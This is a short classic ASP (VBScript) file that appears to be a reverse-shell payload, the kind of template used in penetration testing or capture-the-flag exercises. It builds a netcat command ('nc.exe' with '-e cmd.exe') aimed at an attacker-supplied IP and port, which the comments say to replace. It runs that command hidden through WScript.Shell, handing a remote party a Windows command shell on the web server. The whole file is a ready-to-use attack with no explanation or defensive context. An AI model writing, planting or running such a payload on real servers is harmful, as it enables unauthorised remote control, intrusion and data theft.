<%
Dim ip, port, command
ip = "<LOCAL-IP>"  ' Replace with your IP
port = <PORT>      ' Replace with your port
command = "nc.exe " & ip & " " & port & " -e cmd.exe"

Set objShell = CreateObject("WScript.Shell")
objShell.Run command, 0, True
%>
